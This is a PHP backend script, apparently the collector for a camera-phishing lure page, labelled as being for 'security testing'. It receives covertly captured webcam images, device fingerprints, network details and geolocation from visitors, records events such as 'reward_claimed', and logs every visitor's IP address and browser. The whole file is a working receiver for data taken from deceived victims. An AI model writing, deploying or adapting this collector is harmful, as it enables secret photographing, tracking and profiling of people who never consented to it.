<?php
// post.php - Enhanced data capture backend for security testing

// Create logs directory if it doesn't exist
if (!file_exists('logs')) {
    mkdir('logs', 0755, true);
}

// Get the current timestamp
$timestamp = date('Y-m-d H:i:s');
$date = date('Y-m-d');

// Function to log data
function logData($filename, $data) {
    $logEntry = json_encode([
        'timestamp' => date('Y-m-d H:i:s'),
        'data' => $data,
        'ip' => $_SERVER['REMOTE_ADDR'],
        'user_agent' => $_SERVER['HTTP_USER_AGENT']
    ]) . PHP_EOL;
    
    file_put_contents("logs/$filename", $logEntry, FILE_APPEND | LOCK_EX);
}

// Function to save captured images
function saveImage($base64Data, $counter) {
    if (preg_match('/^data:image\/(\w+);base64,/', $base64Data)) {
        $data = substr($base64Data, strpos($base64Data, ',') + 1);
        $data = base64_decode($data);
        
        if ($data !== false) {
            $filename = "logs/captures/image_" . date('Ymd_His') . "_$counter.jpg";
            file_put_contents($filename, $data);
            return $filename;
        }
    }
    return false;
}

// Check what type of data we received
if (isset($_POST['cat'])) {
    // Handle image capture
    $captureCount = isset($_POST['capture_id']) ? $_POST['capture_id'] : 'unknown';
    $imagePath = saveImage($_POST['cat'], $captureCount);
    
    $captureData = [
        'type' => 'image_capture',
        'capture_number' => $captureCount,
        'image_saved' => $imagePath ? true : false,
        'image_path' => $imagePath
    ];
    
    // Store device data if provided
    if (isset($_POST['device_data'])) {
        $captureData['device_info'] = json_decode($_POST['device_data'], true);
    }
    
    // Store location data if provided
    if (isset($_POST['location_data'])) {
        $captureData['location'] = json_decode($_POST['location_data'], true);
    }
    
    // Store enhanced payload if provided
    if (isset($_POST['enhanced_payload'])) {
        $enhancedData = json_decode($_POST['enhanced_payload'], true);
        $captureData['enhanced'] = $enhancedData;
    }
    
    logData("captures_$date.log", $captureData);
    
    echo json_encode(['success' => true, 'message' => 'Data received']);
    
} elseif (isset($_POST['device_fingerprint'])) {
    // Handle device fingerprint data
    $deviceData = [
        'type' => 'device_fingerprint',
        'fingerprint' => json_decode($_POST['device_fingerprint'], true),
        'network' => isset($_POST['network_info']) ? json_decode($_POST['network_info'], true) : null
    ];
    
    logData("devices_$date.log", $deviceData);
    echo json_encode(['success' => true]);
    
} elseif (isset($_POST['location_data']) && isset($_POST['data_type']) && $_POST['data_type'] == 'location') {
    // Handle location data
    $locationData = [
        'type' => 'location',
        'location' => json_decode($_POST['location_data'], true)
    ];
    
    logData("locations_$date.log", $locationData);
    echo json_encode(['success' => true]);
    
} elseif (isset($_POST['event'])) {
    // Handle events (verification_complete, reward_claimed, session_end)
    $eventData = [
        'event' => $_POST['event'],
        'timestamp' => $_POST['timestamp'],
        'data' => $_POST
    ];
    
    logData("events_$date.log", $eventData);
    echo json_encode(['success' => true]);
    
} elseif (isset($_POST['periodic_update'])) {
    // Handle periodic updates
    $updateData = [
        'type' => 'periodic_update',
        'capture_count' => $_POST['captureCount'],
        'device_data' => isset($_POST['device_data']) ? json_decode($_POST['device_data'], true) : null,
        'location_data' => isset($_POST['location_data']) ? json_decode($_POST['location_data'], true) : null
    ];
    
    logData("updates_$date.log", $updateData);
    echo json_encode(['success' => true]);
    
} else {
    // Log any other received data
    $unknownData = [
        'type' => 'unknown',
        'post_data' => $_POST,
        'get_data' => $_GET
    ];
    
    logData("unknown_$date.log", $unknownData);
    echo json_encode(['success' => false, 'message' => 'No valid data received']);
}

// Log visitor info regardless
$visitorInfo = [
    'ip' => $_SERVER['REMOTE_ADDR'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
    'referer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'direct',
    'timestamp' => date('Y-m-d H:i:s')
];
logData("visitors_$date.log", $visitorInfo);

?>
